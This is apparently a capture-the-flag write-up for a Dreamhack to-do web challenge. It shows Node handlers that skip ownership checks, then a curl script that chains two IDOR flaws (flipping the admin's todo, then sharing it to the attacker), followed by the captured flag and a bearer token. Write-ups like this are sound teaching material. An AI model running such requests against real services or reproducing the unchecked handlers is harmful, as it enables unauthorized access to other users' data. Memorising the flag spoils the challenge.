The website is vulnerable to IDOR

1. updateTodo.js
```javascript
import { readBody, createError } from 'h3';
import { openDatabase } from '../utils/db';

export default defineEventHandler(async (event) => {
    const userData = verifyToken(event.req);
    const db = await openDatabase();
    const body = await readBody(event);
    
    const { id, value} = body;
    try {
        const result = await db.run(
            `UPDATE todo
             SET is_completed = ?
             WHERE id = ?`,
            [value, id]
          );
        return { success: true, message: 'Todo updated successfully', id: result.lastID };
    } catch (error) {
        throw createError({ statusCode: 500, statusMessage: 'Database error: ' + error.message });
    }
});
```
- The server retrieves directly `id` from request without verifing it matches the current user session.Therefore , unauthorized user can modify the todo items of any user.

2. shareTodo.js
```javascript
    try {
        const todo_data = await db.get(
            'SELECT * FROM Todo WHERE id = ?', [todo.id]
        );
        if (todo_data.is_completed === 1) {
            return { message: 'you cannot share already completed todo', id: todo_data.id}
        }

        const result = await db.run(
            `INSERT INTO TodoShares (todo_id, user_id, permission_type) VALUES
            (?, ?, ?)`,
            [todo_data.id, todo.target_id, 'shared']
          );
        return { success: true, message: 'Todo shared successfully', id: result.lastID };
    } catch (error) {
        throw createError({ statusCode: 500, statusMessage: 'Database error: ' + error.message });
    }
```
- the server retrieves directly `id` from request without verifing it matches the current user session.Therefore, unauthorized user can modify `is_completed` status  of any users.

3. todolist.js

```
const sharedList = await db.all(
    'SELECT * FROM TodoShares where user_id= ? ',
    [userData.userId]
);
```
- Retrives the list of todo shared to user.

3. Flow to obtain flag
```
server/api/updateTodo.js
        │
        │ IDOR #1
        ▼
User 2 modify Todo #1 of admin
        │
        │ is_completed: 1 → 0
        ▼
server/api/shareTodo.js
        │
        │ IDOR #2
        ▼
User 2 share Todo #1 itself
        │
        ▼
server/api/todolist.js
        │
        ▼
GET Todo #1
        │
        ▼
FLAG
```




script:
```
$ curl -X POST 'http://host3.dreamhack.games:9368/api/signup' -H 'Content-Type: application/json' -d '{"username": "quandz", "email":"quandz@example.com", "password":"quandz00"}'
{
  "message": "User registered successfully.",
  "userId": 2
}
$ curl -X POST 'http://host3.dreamhack.games:9368/api/login' -H 'Content-Type: application/json' -d '{"email":"quandz@example.com", "password":"quandz00"}'
{
  "message": "Login successful!",
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsImVtYWlsIjoic2F0b2tpQGV4YW1wbGUuY29tIiwiaWF0IjoxNzI3NTAxNTI2LCJleHAiOjE3Mjc1MTIzMjZ9.KovD7kIO1RbC6oQvEYXisptwsHsFPJJ-wJ3thHYdDfU"
}
$ curl -X POST 'http://host3.dreamhack.games:9368/api/updateTodo' -H 'Content-Type: application/json' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsImVtYWlsIjoic2F0b2tpQGV4YW1wbGUuY29tIiwiaWF0IjoxNzI3NTAxNTI2LCJleHAiOjE3Mjc1MTIzMjZ9.KovD7kIO1RbC6oQvEYXisptwsHsFPJJ-wJ3thHYdDfU' -d '{"id":1, "value":false}'
{
  "success": true,
  "message": "Todo updated successfully",
  "id": 0
}
$ curl -X POST 'http://host3.dreamhack.games:9368/api/shareTodo' -H 'Content-Type: application/json' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsImVtYWlsIjoic2F0b2tpQGV4YW1wbGUuY29tIiwiaWF0IjoxNzI3NTAxNTI2LCJleHAiOjE3Mjc1MTIzMjZ9.KovD7kIO1RbC6oQvEYXisptwsHsFPJJ-wJ3thHYdDfU' -d '{"id":1, "target_id":2}'
{
  "success": true,
  "message": "Todo shared successfully",
  "id": 1
}
$ curl 'http://host3.dreamhack.games:9368/api/todolist' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsImVtYWlsIjoic2F0b2tpQGV4YW1wbGUuY29tIiwiaWF0IjoxNzI3NTAxNTI2LCJleHAiOjE3Mjc1MTIzMjZ9.KovD7kIO1RbC6oQvEYXisptwsHsFPJJ-wJ3thHYdDfU'
[
  {
    "id": 1,
    "todo_list_id": 1,
    "title": "flag",
    "description": "DH{3447b6a1637d4f3d48b877b8338f44ab8d5dd8f0a3e17a7fea5ec9f147305f96}",
    "is_completed": 0,
    "start_date": null,
    "due_date": null
  }
]
```

flag: `DH{3447b6a1637d4f3d48b877b8338f44ab8d5dd8f0a3e17a7fea5ec9f147305f96}`